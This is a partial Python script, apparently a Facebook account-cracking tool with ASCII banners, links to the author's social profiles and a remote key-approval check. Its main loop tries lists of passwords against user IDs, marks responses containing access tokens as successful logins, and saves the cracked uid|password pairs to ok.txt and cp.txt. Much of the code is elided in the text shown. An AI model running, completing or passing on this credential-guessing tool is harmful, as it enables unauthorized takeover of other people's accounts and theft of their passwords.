...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Atf-ssk xd\x1b[0m\x1b[1;97m]
...
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
                            Atf Vro..😍😘                      
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Atf XD\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : atfssk47 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/atfssk47\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/heart.hacker.vro\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/atfssk47/approval.txt/blob/main/approval.txt"])
	exit(" [=>] FACEBOOK :  https://www.facebook.com/heart.hacker.vro")
...
def notice():
	...
	os.system("https://www.facebook.com/heart.hacker.vro")
	runtxt("\033[0;97m Key Approval ke Lai Follow Krein >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key Profile post pe coment krein")
	os.system("https://www.facebook.com/heart.hacker.vro")
	subprocess.check_output(["am", "start", "https://www.facebook.com/heart.hacker.vro"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/atfssk47/approval.txt/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
                            Atf Vro..😍😘                              
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m atfssk47-xd\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : atf-ssk-xd \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/atfssk47\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/heart.hacker.vro\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UC5P16fW7h4eAoHEtg_7asNg"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=ATF=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=ATF=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=ATF=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=ATF=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
